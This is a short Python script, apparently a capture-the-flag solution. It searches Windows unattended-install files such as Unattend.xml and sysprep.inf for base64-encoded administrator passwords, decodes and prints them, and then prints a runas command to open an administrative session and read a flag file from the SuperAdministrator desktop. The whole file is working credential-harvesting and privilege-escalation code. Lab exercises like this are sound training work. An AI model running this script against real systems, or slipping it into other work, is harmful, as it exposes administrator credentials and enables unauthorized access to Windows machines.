#!/usr/bin/env python3
import os
import re
import base64

def main():
    paths = [
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\autounattend.xml",
        r"C:\Unattend.xml",
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\unattend.xml"
    ]
    
    password_b64 = None
    for path in paths:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                # 2. Password Extraction
                match = re.search(r'<AdministratorPassword>.*?<Value>(.*?)</Value>', content, re.IGNORECASE | re.DOTALL)
                if match:
                    password_b64 = match.group(1).strip()
                    print(f"Found encoded password in {path}")
                    break
                
                # Also try standard <Password>
                match = re.search(r'<Password>.*?<Value>(.*?)</Value>', content, re.IGNORECASE | re.DOTALL)
                if match:
                    password_b64 = match.group(1).strip()
                    print(f"Found encoded password in {path}")
                    break
                    
    if password_b64:
        # 3. Decoding
        decoded_bytes = base64.b64decode(password_b64)
        try:
            password = decoded_bytes.decode('utf-8')
        except UnicodeDecodeError:
            password = decoded_bytes.decode('utf-16-le')
            
        if password.endswith('AdministratorPassword'):
            password = password[:-21] # Strip trailing 'AdministratorPassword'
            
        print(f"Extracted password: {password}")
        
        # 4. Admin Session
        # Uses runas to establish an administrative session using the extracted credentials
        # and get the flag which is in the desktop of the Admin session.
        cmd = f'runas /user:SuperAdministrator "cmd.exe /c type C:\\Users\\SuperAdministrator\\Desktop\\flag.txt"'
        print("To retrieve the flag, run the following command and enter the password:")
        print(cmd)
    else:
        print("No password found in typical unattended file locations.")

if __name__ == "__main__":
    main()
